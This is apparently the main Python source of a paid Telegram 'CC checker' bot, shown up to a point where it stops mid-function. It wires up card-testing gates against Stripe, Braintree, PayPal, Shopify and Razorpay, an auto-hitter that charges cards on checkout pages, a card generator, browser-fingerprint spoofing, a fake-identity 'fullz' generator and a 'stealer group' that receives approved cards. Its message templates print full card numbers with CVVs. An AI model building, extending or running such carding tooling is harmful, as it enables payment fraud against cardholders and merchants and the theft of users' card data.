#!/usr/bin/env python3
"""
================================================================================
  🎀 ONICHAN BOT - Secure Edition
  Premium CC Checker with Hot Sexy Anime Girls GIFs 4K
  Copyright © 2025 - All Rights Reserved
================================================================================
"""

import os
import re
import json
import requests
import random
import time
import logging
import sys
from logging.handlers import RotatingFileHandler

# ── Error log file (read by /geterror) ───────────────────────────────────────
ERROR_LOG_FILE = "/tmp/bot_errors.log"

class _TeeStream:
    """Write to both the original stream and the error log file."""
    def __init__(self, original, log_path):
        self._orig = original
        self._path = log_path
    def write(self, data):
        self._orig.write(data)
        if data.strip():
            try:
                with open(self._path, "a", encoding="utf-8") as f:
                    f.write(data)
            except Exception:
                pass
    def flush(self):
        self._orig.flush()
    def fileno(self):
        return self._orig.fileno()

# Redirect stderr so all Python exceptions/tracebacks land in the log file
sys.stderr = _TeeStream(sys.__stderr__, ERROR_LOG_FILE)

# Also wire up the logging module to append WARNING+ to the same file
_log_handler = RotatingFileHandler(ERROR_LOG_FILE, maxBytes=2 * 1024 * 1024,
                                    backupCount=1, encoding="utf-8")
_log_handler.setLevel(logging.WARNING)
_log_handler.setFormatter(logging.Formatter(
    "%(asctime)s [%(levelname)s] %(name)s: %(message)s"))
logging.getLogger().addHandler(_log_handler)
# ─────────────────────────────────────────────────────────────────────────────
import asyncio
import aiohttp
from datetime import datetime
from typing import Optional
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes, MessageHandler, filters, PreCheckoutQueryHandler
from telegram import LabeledPrice
from telegram.constants import ParseMode
import html
from html import escape as html_escape
from config import *

def sanitize_ai_response(text: str) -> str:
    """Sanitize AI response for Telegram HTML - escape HTML and format code blocks"""
    if not text:
        return ""
    
    text = html_escape(text)
    
    import re
    def replace_code_block(match):
        lang = match.group(1) or ""
        code = match.group(2)
        return f"<pre><code class=\"language-{lang}\">{code}</code></pre>"
    
    text = re.sub(r'```(\w*)\n?(.*?)```', replace_code_block, text, flags=re.DOTALL)
    text = re.sub(r'`([^`]+)`', r'<code>\1</code>', text)
    text = re.sub(r'\*\*([^*]+)\*\*', r'<b>\1</b>', text)
    text = re.sub(r'__([^_]+)__', r'<u>\1</u>', text)
    
    return text

from modules.gate_checker import check_card_php, format_gate_response
from modules.approved_cards_logger import log_approved_card, get_approved_cards, get_approved_count, get_user_approved_cards, set_stealer_group_id, get_stealer_group_id, send_to_stealer_group
from modules.premium_plans import generate_invoice, get_all_plans, get_plan_info, get_total_revenue, get_payment_stats
from modules.premium_keys import create_key, redeem_key, validate_key, get_all_keys, get_active_keys, get_key_stats, create_batch_keys, format_keys_display, burn_unused_keys
from modules.cc_cleaner import extract_cards_from_junk, clean_and_format_cards, remove_duplicates, filter_by_brand, sort_cards, get_statistics
from modules.cc_generator import generate_cards, parse_gen_format, get_card_brand, validate_generated_card
from modules.shopify_auto import check_shopify_auto, get_site_product_info
from modules.user_config import (
    get_user_config, set_user_site, set_user_proxy, 
    clear_user_site, clear_user_proxy, get_user_sites, 
    get_user_proxies, remove_user_site, remove_user_proxy,
    clear_all_sites, clear_all_proxies, clean_invalid_sites,
    check_proxy_live, get_user_email, set_user_email, clear_user_email,
    get_captcha_key, set_captcha_key, clear_captcha_key
)
from modules.oxapay import (
    create_invoice as cp_create_order, 
    get_pending_payments as cp_get_pending,
    check_payment_status as cp_query_order, 
    confirm_payment as cp_mark_complete,
    activate_premium as cp_activate_premium,
    PREMIUM_PLANS as cp_get_plans,
    SUPPORTED_CRYPTOS as cp_supported_cryptos,
    format_payment_message as oxa_format_payment
)
CRYPTO_PLANS = cp_get_plans
from modules.auto_hitter import (
    extract_checkout_url, detect_url_type, charge_card as auto_hitter_charge,
    check_single_card,
    parse_card as auto_hitter_parse_card, parse_cards as auto_hitter_parse_cards,
    format_checkout_info, format_charge_result, mask_card, full_card,
    format_card_result, format_mass_summary, try_all_approaches,
    get_user_proxies as ah_get_user_proxies, add_user_proxy as ah_add_user_proxy, 
    remove_user_proxy as ah_remove_user_proxy, get_user_proxy as ah_get_user_proxy,
    get_user_email as ah_get_user_email, set_user_email as ah_set_user_email, 
    remove_user_email as ah_remove_user_email,
    get_proxy_info as ah_get_proxy_info, check_proxy_alive as ah_check_proxy_alive, 
    check_proxies_batch as ah_check_proxies_batch, obfuscate_ip as ah_obfuscate_ip,
    check_checkout_active as ah_check_checkout_active,
    fetch_checkout_page_data as ah_fetch_checkout_data,
    get_currency_symbol, get_proxy_url as ah_get_proxy_url,
    save_user_bin, get_user_saved_bins, delete_user_bin,
    parse_gen_input, generate_cards_from_bin,
    bulk_hit_cards
)
from modules.stripe_tls import get_checkout_info as tls_get_checkout_info
try:
    import stripe
except ImportError:
    stripe = None

# Fake Auto Hitter Response Mode
FAKE_AUTOHITTER_MODE = False

from modules import ton_monitor as _ton_monitor

# ─── Telegram Animated Premium Emojis (Semex Pack) ──────────────────────────
def _pe(emoji_id: str, fallback: str) -> str:
    return f'<tg-emoji emoji-id="{emoji_id}">{fallback}</tg-emoji>'

EMOJI = {
    "charged":    _pe("5895458739703517004", "✅"),
    "live":       _pe("5420315771991497307", "🔥"),
    "declined":   _pe("5852812849780362931", "❌"),
    "3ds":        _pe("5472308992514464048", "🔐"),
    "expired":    _pe("5413704112220949842", "⏰"),
    "error":      _pe("5213205860498549992", "⚠️"),
    "hitting":    _pe("5454415424319931791", "⌛️"),
    "stopped":    _pe("6325507973896472524", "🛑"),
    "welcome":    _pe("6325517457184261445", "👋"),
    "back":       _pe("5253997076169115797", "🔙"),
    "regenerate": _pe("6066348702363031988", "🔄"),
    "bolt":       _pe("5431449001532594346", "⚡️"),
    "crown":      _pe("5467406098367521267", "👑"),
    "ban":        _pe("6325636152900453913", "🤕"),
    "plan":       _pe("5197269100878907942", "✍️"),
    "ticket":     _pe("5418010521309815154", "🎫"),
    "stats":      _pe("5231200819986047254", "📊"),
    "users":      _pe("5453957997418004470", "👥"),
    "search":     _pe("5188217332748527444", "🔍"),
    "broadcast":  _pe("5424818078833715060", "📣"),
    "plug":       _pe("5195097801637243044", "🦏"),
    "link":       _pe("5271604874419647061", "🔗"),
    "trash":      _pe("5372825386591732174", "🗑"),
    "question":   _pe("5436113877181941026", "❓"),
    "blocked":    _pe("5240241223632954241", "🚫"),
    "free":       _pe("5406756500108501710", "🆓"),
    "card":       _pe("5267300544094948794", "💳"),
    "risky":      _pe("5895443668663275064", "🟡"),
    "danger":     _pe("5852753450382659113", "🔴"),
    "infinity":   _pe("6296372968754776071", "♾"),
    "lock":       _pe("5316858509571144216", "🔒"),
}

EMOJI_PLAIN = {
    "charged": "✅", "live": "🔥", "declined": "❌", "3ds": "🔐",
    "expired": "⏰", "error": "⚠️", "hitting": "⌛️", "stopped": "🛑",
    "welcome": "👋", "back": "🔙", "regenerate": "🔄", "bolt": "⚡️",
    "crown": "👑", "ban": "🤕", "plan": "✍️", "ticket": "🎫",
    "stats": "📊", "users": "👥", "search": "🔍", "broadcast": "📣",
    "plug": "🦏", "link": "🔗", "trash": "🗑", "question": "❓",
    "blocked": "🚫", "free": "🆓", "card": "💳", "risky": "🟡",
    "danger": "🔴", "infinity": "♾", "lock": "🔒",
}

PE_CHECK   = EMOJI["charged"]
PE_CROSS   = EMOJI["declined"]
PE_BOLT    = EMOJI["bolt"]
PE_FIRE    = EMOJI["live"]
PE_GEM     = EMOJI["crown"]
PE_TARGET  = EMOJI["bolt"]
PE_CARD    = EMOJI["card"]
PE_LINK    = EMOJI["link"]
PE_STORE   = EMOJI["bolt"]
PE_MAIL    = EMOJI["card"]
PE_CLOCK   = EMOJI["hitting"]
PE_LOCK    = EMOJI["3ds"]
PE_STOP    = EMOJI["stopped"]
PE_SAVE    = EMOJI["charged"]
PE_TRASH   = EMOJI["trash"]
PE_KEY     = EMOJI["lock"]
PE_PROC    = EMOJI["bolt"]

EID = {
    "charged":    "5895458739703517004",
    "live":       "5420315771991497307",
    "declined":   "5852812849780362931",
    "3ds":        "5472308992514464048",
    "expired":    "5413704112220949842",
    "error":      "5213205860498549992",
    "hitting":    "5454415424319931791",
    "stopped":    "6325507973896472524",
    "welcome":    "6325517457184261445",
    "back":       "5253997076169115797",
    "regenerate": "6066348702363031988",
    "bolt":       "5431449001532594346",
    "crown":      "5467406098367521267",
    "ban":        "6325636152900453913",
    "plan":       "5197269100878907942",
    "ticket":     "5418010521309815154",
    "stats":      "5231200819986047254",
    "users":      "5453957997418004470",
    "search":     "5188217332748527444",
    "broadcast":  "5424818078833715060",
    "plug":       "5195097801637243044",
    "link":       "5271604874419647061",
    "trash":      "5372825386591732174",
    "question":   "5436113877181941026",
    "blocked":    "5240241223632954241",
    "free":       "5406756500108501710",
    "card":       "5267300544094948794",
    "risky":      "5895443668663275064",
    "danger":     "5852753450382659113",
    "infinity":   "6296372968754776071",
    "lock":       "5316858509571144216",
}

_ANIMATED_EMOJI = {
    "✨": "5368324170671202286", "🎀": "5454172415070315962",
    "💕": "5368324170671202286", "🌸": "5454388756867986435",
    "👑": "5467406098367521267", "🆔": "5422683699130933153",
    "📅": "5413704112220949842", "💳": "5267300544094948794",
    "✅": "5895458739703517004", "❌": "5852812849780362931",
    "📈": "5231200819986047254", "🌷": "5454388756867986435",
    "🌺": "5454388756867986435", "🦋": "5431449001532594346",
    "📱": "5407025283456835913", "🔮": "5361837567463399422",
    "🧚\u200d♀️": "5368324170671202286", "🧚": "5368324170671202286",
    "🔐": "5472308992514464048", "💖": "5368324170671202286",
    "💗": "5368324170671202286", "💓": "5368324170671202286",
    "⚡": "5431449001532594346", "🔥": "5420315771991497307",
    "💎": "5471952986970267163", "🚀": "5445284980978621387",
    "⭐": "5895578414672252671", "💰": "5375296873982604963",
    "💡": "5472146462362048818", "⏰": "5413704112220949842",
    "🎮": "5467583879948803288", "🏆": "5409008750893734809",
    "🎬": "5375464961822695044", "🎨": "5431456208487716895",
    "📊": "5231200819986047254", "🔄": "5454415424319931791",
    "🚫": "6325636152900453913", "🛑": "6325507973896472524",
    "🔍": "5188217332748527444", "📢": "5424818078833715060",
    "🗑️": "5372825386591732174", "❓": "5436113877181941026",
    "⚠️": "5213205860498549992", "🔗": "5271604874419647061",
    "🆓": "5406756500108501710", "🎫": "5418010521309815154",
    "☎️": "5465169893580086142", "🔒": "5472308992514464048",
    "💸": "5472030678633684592", "🪙": "5379600444098093058",
    "🎖": "5332547853304734597", "🏅": "5334644364280866007",
    "⏳": "5451732530048802485", "💻": "5431376038628171216",
    "🎤": "5382360961313152917", "🎸": "5465665777619204788",
    "💜": "5368324170671202286", "💬": "5472146462362048818",
    "🔢": "5231200819986047254", "💠": "5471952986970267163",
    "🏦": "5375296873982604963", "🌍": "5445284980978621387",
    "⏱": "5413704112220949842", "👤": "5453957997418004470",
    "📉": "5231200819986047254", "📝": "5197269100878907942",
    "📌": "5431449001532594346", "🏪": "5375296873982604963",
    "📋": "5197269100878907942", "👥": "5453957997418004470",
    "📣": "5424818078833715060",
}

_SORTED_ANIM_KEYS = sorted(_ANIMATED_EMOJI.keys(), key=len, reverse=True)

def ae(text):
    for emoji_char in _SORTED_ANIM_KEYS:
        if emoji_char in text:
            eid = _ANIMATED_EMOJI[emoji_char]
            text = text.replace(emoji_char, f'<tg-emoji emoji-id="{eid}">{emoji_char}</tg-emoji>')
    return text

def _btn(text, style="danger", icon=None, **kwargs):
    return InlineKeyboardButton(text, style=style, icon_custom_emoji_id=icon, **kwargs)
# ─────────────────────────────────────────────────────────────────────────────

_bot_start_time = time.time()

_pending_hits = {}
_pending_bin_hits = {}
_active_hits = {}
_checked_proxies = {}

def _load_proxy_modes() -> dict:
    try:
        from config import PROXY_MODE_FILE
        if os.path.exists(PROXY_MODE_FILE):
            with open(PROXY_MODE_FILE, 'r') as f:
                return json.load(f)
    except:
        pass
    return {}

def _save_proxy_modes(data: dict):
    try:
        from config import PROXY_MODE_FILE
        os.makedirs(os.path.dirname(PROXY_MODE_FILE), exist_ok=True)
        with open(PROXY_MODE_FILE, 'w') as f:
            json.dump(data, f, indent=2)
    except:
        pass

def get_user_proxy_mode(user_id: int) -> str:
    modes = _load_proxy_modes()
    return modes.get(str(user_id), "system")

def set_user_proxy_mode(user_id: int, mode: str):
    modes = _load_proxy_modes()
    modes[str(user_id)] = mode
    _save_proxy_modes(modes)

def _pick_proxy(user_id: int = None) -> str:
    from config import SYSTEM_PROXIES
    if user_id:
        mode = get_user_proxy_mode(user_id)
        if mode == "own":
            user_proxies = ah_get_user_proxies(user_id)
            if user_proxies:
                return random.choice(user_proxies)
    if SYSTEM_PROXIES:
        return random.choice(SYSTEM_PROXIES)
    return None

def _cleanup_pending_hits():
    import time as _t
    now = _t.time()
    expired = [k for k, v in _pending_hits.items() if now - v.get("ts", 0) > 600]
    for k in expired:
        del _pending_hits[k]
from modules.rpp_gate import check_razorpay, parse_card as rpp_parse_card
from modules.rz_gate import check_rz, check_rz_async, format_rz_response, check_mass_rz_async
from modules.payu_gate import check_payu, check_payu_async, format_payu_response, check_mass_payu_async
from modules.str_gate import check_str
from modules.b3n_gate import check_b3n
from modules.b3_gate import check_b3, mass_check_b3
from modules.ast_gate import check_ast, mass_check_ast
from modules.bin_lookup import lookup_bin, format_mass_card_result, format_mass_header
from modules.chatgpt import ask_ai

from modules.credits import (
    init_credits_tables, get_balance, add_credits, deduct_credits,
    transfer_credits, generate_credit_voucher, redeem_voucher,
    get_gate_cost, get_transaction_history, get_all_vouchers,
)
from modules.reseller import (
    init_reseller_tables, is_reseller, add_reseller, remove_reseller,
    get_reseller_info, add_client, get_clients, get_all_resellers,
)
from modules.escrow import (
    init_escrow_tables, create_deal, get_deal, join_deal,
    confirm_deal, dispute_deal, admin_resolve_deal, get_user_deals,
    get_disputed_deals,
)
from modules.gate_monitor import (
    init_monitor_tables, record_check_result, get_gate_stats,
    run_gate_health_check, start_monitor,
)
from modules.channel_scraper import (
    init_scraper_tables, add_channel, remove_channel,
    get_active_channels, get_scraper_stats, process_channel_message,
)
from modules.hibp_watcher import (
    init_hibp_tables, add_watch, remove_watch,
    get_user_watches, start_watcher as start_hibp_watcher,
)
from modules.fingerprint_spoofer import get_spoofed_headers, get_random_proxy
from modules.fake_identity import generate_fullz
from modules.wormgpt import ask_wormgpt
from modules.database import (
    init_database,
    init_database_sync,
    init_supabase,
    is_db_connected,
    is_user_premium_sync,
    is_user_approved_sync,
    is_user_banned_sync,
    add_user_sync,
    approve_user_sync,
    ban_user_sync,
    unban_user_sync,
    set_premium_sync,
    remove_premium_sync,
    get_approved_users_sync,
    get_banned_users_sync,
    get_premium_users_sync,
    sync_log_card_check,
    sync_get_all_users,
    sync_get_pending_users,
    # MongoDB Aliases
    init_mongodb,
    mongodb_connected,
    mongo_is_owner,
    mongo_is_premium,
    mongo_is_banned,
    mongo_is_approved,
    mongo_add_user,
    mongo_approve_user,
    mongo_ban_user,
    mongo_unban_user,
    mongo_set_premium,
    mongo_remove_premium,
    mongo_get_all_users,
    mongo_get_pending_users,
    mongo_get_premium_users,
    mongo_log_card,
    # Supabase Aliases
    supabase_connected,
    supabase_is_premium,
    supabase_is_approved,
    supabase_is_banned,
    supabase_add_user,
    supabase_get_approved_users,
    supabase_get_banned_users,
    supabase_get_premium_users
)

# Keep alive for Replit
try:
    from keep_alive import keep_alive
    REPLIT_MODE = True
except ImportError:
    REPLIT_MODE = False

# ============================================================================
# DATABASE MANAGEMENT
# ============================================================================

def ensure_database_files():
    """Create database files if they don't exist using centralized config"""
    init_database_sync()
    
    # Add owner if not exists
    if OWNER_ID > 0:
        try:
            with open(DB_OWNER, 'r') as f:
                owners = f.read()
            if str(OWNER_ID) not in owners:
                with open(DB_OWNER, 'a') as f:
                    f.write(f"{OWNER_ID}\n")
        except:
            with open(DB_OWNER, 'w') as f:
                f.write(f"{OWNER_ID}\n")
        
        if supabase_connected():
            supabase_add_user(OWNER_ID, OWNER_USERNAME, "approved")
            try:
                from modules.database import _execute_with_retry
                _execute_with_retry("""
                    UPDATE users SET is_owner = TRUE, premium = TRUE
                    WHERE user_id = %s
                """, (OWNER_ID,))
            except Exception as e:
                print(f"[DB] Failed to set owner flag: {e}")

# ─── Permission cache (TTL = 45 s) ───────────────────────────────────────────
import threading as _threading
import time as _perm_time

_PERM_TTL = 45           # seconds before a cached result expires
_HARDCODED_OWNERS = {8119946836, 8268257476, 8271254197}

class _PermCache:
    """Thread-safe TTL cache for per-user permission lookups."""
    def __init__(self):
        self._lock = _threading.Lock()
        self._store: dict = {}        # key -> (value, expire_ts)

    def get(self, key):
        with self._lock:
            entry = self._store.get(key)
            if entry and _perm_time.monotonic() < entry[1]:
                return entry[0], True
            return None, False

    def set(self, key, value, ttl=_PERM_TTL):
        with self._lock:
            self._store[key] = (value, _perm_time.monotonic() + ttl)

    def invalidate(self, user_id):
        """Call this when a user's permissions change (ban, premium set, etc.)."""
        with self._lock:
            for prefix in ("owner", "premium", "banned", "approved", "rank", "status"):
                self._store.pop(f"{prefix}:{user_id}", None)

    def clear(self):
        with self._lock:
            self._store.clear()

_perm_cache = _PermCache()

# ─── In-memory file caches (reloaded every 60 s) ─────────────────────────────
_file_cache: dict = {}   # path -> (set_of_ids, expire_ts)
_FILE_CACHE_TTL = 60

def _load_id_file(path: str) -> set:
    """Return a cached set of integer IDs from a newline-separated text file."""
    now = _perm_time.monotonic()
    entry = _file_cache.get(path)
    if entry and now < entry[1]:
        return entry[0]
    ids: set = set()
    try:
        if os.path.exists(path):
            with open(path, 'r') as f:
                for line in f:
                    line = line.strip()
                    if line.isdigit():
                        ids.add(int(line))
    except Exception:
        pass
    _file_cache[path] = (ids, now + _FILE_CACHE_TTL)
    return ids

def invalidate_user_cache(user_id: int):
    """Invalidate all cached data for a user (call after any permission change)."""
    _perm_cache.invalidate(user_id)
    # Also flush file caches so next read picks up the change
    _file_cache.clear()

# ─────────────────────────────────────────────────────────────────────────────

def is_owner(user_id):
    """Check if user is owner - checks multiple sources for resilience"""
    # Hardcoded admins
    if user_id in _HARDCODED_OWNERS:
        return True
    
    # Check config OWNER_ID first
    if user_id == OWNER_ID:
        return True

    # TTL cache check
    cached, hit = _perm_cache.get(f"owner:{user_id}")
    if hit:
        return cached

    result = False
    # Check PostgreSQL database
    if supabase_connected():
        from modules.database import is_user_owner_sync
        if is_user_owner_sync(user_id):
            result = True
    
    # Fallback to local file (cached in memory)
    if not result:
        if user_id in _load_id_file(DB_OWNER):
            result = True

    _perm_cache.set(f"owner:{user_id}", result)
    return result

def check_premium_status(user_id):
    """Check premium status - returns 'active', 'expired', or 'none'"""
    if user_id in _HARDCODED_OWNERS:
        return "active"
    if is_owner(user_id):
        return "active"

    cached, hit = _perm_cache.get(f"status:{user_id}")
    if hit:
        return cached

    status = "none"
    try:
        if supabase_connected():
            from modules.database import _execute_with_retry
            result = _execute_with_retry(
                "SELECT premium, premium_expiry, is_owner FROM users WHERE user_id = %s",
                (user_id,), fetch_one=True
            )
            if result:
                if result.get("is_owner"):
                    status = "active"
                elif result.get("premium"):
                    expiry = result.get("premium_expiry")
                    if expiry:
                        if isinstance(expiry, str):
                            expiry = datetime.fromisoformat(expiry.replace("Z", "+00:00"))
                        if hasattr(expiry, 'tzinfo') and expiry.tzinfo:
                            expiry = expiry.replace(tzinfo=None)
                        status = "active" if expiry > datetime.utcnow() else "expired"
                    else:
                        status = "active"
                elif result.get("premium_expiry"):
                    status = "expired"
    except Exception:
        pass

    _perm_cache.set(f"status:{user_id}", status)
    return status

def is_premium(user_id):
    """Check if user has premium access - DB is authoritative when connected, files are fallback only"""
    if user_id in _HARDCODED_OWNERS:
        return True
    if is_owner(user_id):
        return True

    cached, hit = _perm_cache.get(f"premium:{user_id}")
    if hit:
        return cached

    result = False
    try:
        if supabase_connected():
            result = supabase_is_premium(user_id)
    except Exception as e:
        print(f"[Premium] Database check failed for {user_id}: {e}")

    if not result:
        # File fallback — cached in memory
        try:
            if os.path.exists(DB_PREMIUM):
                with open(DB_PREMIUM, 'r') as f:
                    for line in f:
                        if line.strip():
                            parts = line.strip().split()
                            if len(parts) >= 1 and parts[0].isdigit() and int(parts[0]) == user_id:
                                if len(parts) >= 2:
                                    try:
                                        expiry = datetime.strptime(parts[1], "%Y-%m-%d")
                                        if expiry > datetime.now():
                                            result = True
                                            break
                                    except Exception:
                                        pass
                                else:
                                    result = True
                                    break
        except Exception:
            pass

    if not result:
        try:
            from config import DATABASE_DIR
            paid_file = os.path.join(DATABASE_DIR, "paid.txt")
            if os.path.exists(paid_file):
                with open(paid_file, 'r') as f:
                    for line in f:
                        if line.strip():
                            parts = line.strip().split()
                            if len(parts) >= 2 and parts[0].isdigit() and int(parts[0]) == user_id:
                                try:
                                    expiry = datetime.strptime(parts[1], "%Y-%m-%d")
                                    if expiry > datetime.now():
                                        result = True
                                        break
                                except Exception:
                                    pass
        except Exception:
            pass

    _perm_cache.set(f"premium:{user_id}", result)
    return result

def is_banned(user_id):
    """Check if user is banned - checks multiple sources"""
    cached, hit = _perm_cache.get(f"banned:{user_id}")
    if hit:
        return cached

    result = False
    if supabase_connected():
        if supabase_is_banned(user_id):
            result = True

    if not result:
        if user_id in _load_id_file(DB_BANNED):
            result = True

    _perm_cache.set(f"banned:{user_id}", result)
    return result

def is_approved(user_id):
    """Check if user is approved to use bot - checks multiple sources"""
    if is_owner(user_id):
        return True
    if is_banned(user_id):
        return False
    if not REQUIRE_APPROVAL:
        return True

    cached, hit = _perm_cache.get(f"approved:{user_id}")
    if hit:
        return cached

    result = False
    if supabase_connected():
        if supabase_is_approved(user_id):
            result = True

    if not result:
        if user_id in _load_id_file(DB_FREE):
            result = True

    if not result:
        result = is_premium(user_id)

    _perm_cache.set(f"approved:{user_id}", result)
    return result

def get_user_rank(user_id):
    """Get user rank"""
    cached, hit = _perm_cache.get(f"rank:{user_id}")
    if hit:
        return cached

    if is_banned(user_id):
        rank = "🚫 Banned"
    elif is_owner(user_id):
        rank = "👑 Owner"
    elif is_premium(user_id):
        rank = "💎 Premium"
    elif is_approved(user_id):
        rank = "✅ Approved"
    else:
        rank = "👤 Free"

    _perm_cache.set(f"rank:{user_id}", rank)
    return rank

def _get_user_rank_legacy(user_id):
    """Legacy stub — keep signature for any remaining callers."""
    if is_banned(user_id):
        return "🚫 Banned"
    if is_owner(user_id):
        return "👑 Owner"
    if is_premium(user_id):
        return "💎 Premium"
    if is_approved(user_id):
        return "🆓 Free"
    return "⏳ Pending"

def add_to_pending(user_id, username, first_name):
    """Add user to pending approval"""
    if supabase_connected():
        supabase_add_user(user_id, username, "pending")
    try:
        with open(DB_PENDING, 'a') as f:
            f.write(f"{user_id}|{username}|{first_name}|{datetime.now()}\n")
    except:
        pass


# ============================================================================
# TENOR GIF SEARCH - HOT SEXY ANIME GIRLS 4K
# ============================================================================

_gif_cache = {}

def search_tenor_gif(query, limit=10):
    try:
        url = "https://tenor.googleapis.com/v2/search"
        params = {
            "q": query, "key": TENOR_API_KEY,
            "client_key": "nepali_momo_bot", "limit": limit,
            "media_filter": "gif", "contentfilter": "off"
        }
        response = requests.get(url, params=params, timeout=5)
        data = response.json()
        if "results" in data and len(data["results"]) > 0:
            gifs = []
            for result in data["results"]:
                if "media_formats" in result and "gif" in result["media_formats"]:
                    gifs.append(result["media_formats"]["gif"]["url"])
            return gifs
        return []
    except:
        return []

_GIF_QUERIES = {
    "welcome": ["sexy anime girl wink", "hot anime girl wave", "anime girl cute smile", "anime girl seductive"],
    "loading": ["anime girl waiting", "anime thinking", "anime girl loading"],
    "success": ["anime girl happy celebrate", "sexy anime victory", "anime girl excited"],
    "failed":  ["anime girl sad", "anime crying", "anime girl disappointed"],
    "premium": ["anime girl rich luxury", "anime queen vip", "anime girl powerful"],
    "admin":   ["anime girl boss", "anime queen powerful", "anime girl confident"],
    "banned":  ["anime girl angry", "anime mad furious", "anime girl serious"],
}
_gif_pending = set()  # queries currently being fetched (background)

def _refresh_gif_cache_bg(query):
    """Fire-and-forget background fetch — never blocks any caller."""
    if query in _gif_pending:
        return
    _gif_pending.add(query)
    import threading
    def _w():
        try:
            gifs = search_tenor_gif(query, 8)
            if gifs:
                _gif_cache[query] = gifs
        finally:
            _gif_pending.discard(query)
    threading.Thread(target=_w, daemon=True).start()

def get_sexy_anime_gif(category):
    """Non-blocking GIF fetcher. Always returns instantly:
       - cached result if available, else
       - any cached fallback from another category, else
       - None (caller can skip the GIF)
       Cache is refreshed asynchronously in the background.
    """
    queries = _GIF_QUERIES.get(category, _GIF_QUERIES["welcome"])
    query = random.choice(queries)

    if query in _gif_cache and _gif_cache[query]:
        return random.choice(_gif_cache[query])

    # Schedule background refresh — does NOT block the event loop
    _refresh_gif_cache_bg(query)

    # Try any other cached query in the same category
    for q in queries:
        if q in _gif_cache and _gif_cache[q]:
            return random.choice(_gif_cache[q])

    # Try any cached query at all (cross-category fallback)
    for q_list in _GIF_QUERIES.values():
        for q in q_list:
            if q in _gif_cache and _gif_cache[q]:
                return random.choice(_gif_cache[q])

    # Cold cache — return None; caller falls back to text-only message
    return None

def _preload_gif_cache():
    """Warm the cache at startup so the first user never waits."""
    import threading
    def _w():
        for q_list in _GIF_QUERIES.values():
            for q in q_list:
                if q not in _gif_cache:
                    try:
                        gifs = search_tenor_gif(q, 8)
                        if gifs:
                            _gif_cache[q] = gifs
                    except Exception:
                        pass
        print(f"🎬 GIF cache preloaded — {len(_gif_cache)} queries cached")
    threading.Thread(target=_w, daemon=True).start()

async def send_approved_card_with_gif(update: Update, card: str, gate: str, response: str, check_time: float, bin_info: dict = None):
    """Send approved card notification with anime GIF (Onichan branding)"""
    try:
        gif_url = get_sexy_anime_gif("success")

        parts = card.split('|')
        if len(parts) >= 4:
            cc, mm, yy, cvv = parts[0], parts[1], parts[2], parts[3]
        else:
            cc = card
            mm = yy = cvv = "?"

        if not bin_info:
            from modules.gate_checker import get_bin_info
            bin_info = get_bin_info(cc)

        gate_names = {
            'st': 'Stripe Auth', 'ss': 'Stripe Auth $0.5', 'bu': 'Braintree Auth',
            'pp': 'PayPal $1', 'ppv': 'PayPal V2', 'sor': 'Stripe $2',
            'st5': 'Stripe $5', 'st12': 'Stripe $12', 'str': 'Stripe $15',
            'dep': 'Stripe $49', 'b3': 'Braintree $3', 'b3n': 'Braintree $5',
            'rz': 'Razorpay ₹10', 'stm': 'Stripe Mass Auth', 'se1': 'Stripe €1',
            'sh': 'Shopify', 'sh6': 'Shopify $6', 'sh8': 'Shopify $8',
            'sh10': 'Shopify $10', 'sh13': 'Shopify $13', 'bt1': 'Braintree $1',
            'bt3d': 'Braintree 3D', 'sq': 'Square Auth', 'auz': 'Authorize $0',
            'st1': 'Stripe $1', 'ast': 'Auto Stripe',
        }
        gate_display = gate_names.get(gate, gate.upper())

        brand = bin_info.get('brand', 'Unknown') if bin_info else 'Unknown'
        card_type = bin_info.get('type', '') if bin_info else ''
        level = bin_info.get('level', '') if bin_info else ''
        network_line = brand
        if card_type and card_type.upper() != 'UNKNOWN':
            network_line += f" • {card_type}"
        if level and level.upper() != 'UNKNOWN':
            network_line += f" • {level}"

        bank = bin_info.get('bank', 'Unknown') if bin_info else 'Unknown'
        country = bin_info.get('country', 'Unknown') if bin_info else 'Unknown'
        bin_code = bin_info.get('bin', cc[:6]) if bin_info else cc[:6]
        yy_display = yy if len(yy) == 4 else f"20{yy}"

        sep = "━━━━━━━━━━━━━━━━━━━━"

        msg = f"""💜 <b>ONICHAN • {gate_display.upper()}</b>
{sep}
💳 <code>{cc}|{mm}|{yy}|{cvv}</code>
{sep}
📈 <b>Status</b>   : Approved ✅
💬 <b>Response</b> : {response[:60] if response else 'Charged'}
{sep}
🔢 <b>BIN</b>      : {bin_code}
💠 <b>Network</b>  : {network_line}
🏦 <b>Bank</b>     : {bank}
🌍 <b>Country</b>  : {country}
{sep}
⏱ <b>Time</b>     : {check_time:.2f}s
⚡ <b>Powered</b>  : @{SUPPORT_USERNAME}"""

        msg = ae(msg)

        await update.message.reply_animation(
            animation=gif_url,
            caption=msg,
            parse_mode=ParseMode.HTML
        )
    except Exception as e:
        print(f"Error sending approved card GIF: {e}")
        await update.message.reply_text(
            f"✅ <b>APPROVED</b>\n<code>{card}</code>\n{response}",
            parse_mode=ParseMode.HTML
        )

async def send_hit_to_user_pm(bot, user_id: int, card_data: dict, checkout_data: dict, result: dict, check_time: float):
    """Send successful hit to user's private chat with anime GIF"""
    try:
        from modules.bin_lookup import lookup_bin

        cc = card_data.get('cc', '')
        mm = card_data.get('month', '')
        yy = card_data.get('year', '')
        cvv = card_data.get('cvv', '')
        full_card = f"{cc}|{mm}|{yy}|{cvv}"
        bin6 = cc[:6]

        bin_info = lookup_bin(bin6) if cc else {}
        bank = (bin_info.get('bank') or 'UNKNOWN').upper()
        brand = (bin_info.get('brand') or 'UNKNOWN').upper()
        country_name = (bin_info.get('country') or 'Unknown').upper()
        country_flag = bin_info.get('country_emoji', '🌍')

        merchant = html.escape(str(checkout_data.get('merchant', 'Unknown')))
        price = checkout_data.get('price', 0)
        currency = (checkout_data.get('currency') or 'USD').upper()
        sym = get_currency_symbol(currency)
        price_str = f"{sym}{float(price):.2f}" if price else "N/A"
        amount_str = f"{price_str} {currency}" if price else "N/A"

        checkout_url = checkout_data.get('url', '')
        url_short = html.escape((checkout_url[:45] + "...") if len(checkout_url) > 45 else checkout_url)

        response_text = html.escape(str(result.get('response', 'Payment Successful'))[:80])
        status = result.get('status', 'CHARGED')

        sep = "━━━━━━━━━━━━━━━━━━━━"

        hit_msg = (
            f"💜 <b>ONICHAN • STRIPE HITTER</b>\n"
            f"{sep}\n"
            f"💳 <code>{full_card}</code>\n"
            f"{sep}\n"
            f"📈 <b>Status</b>   : Charged ✅\n"
            f"💬 <b>Response</b> : {response_text}\n"
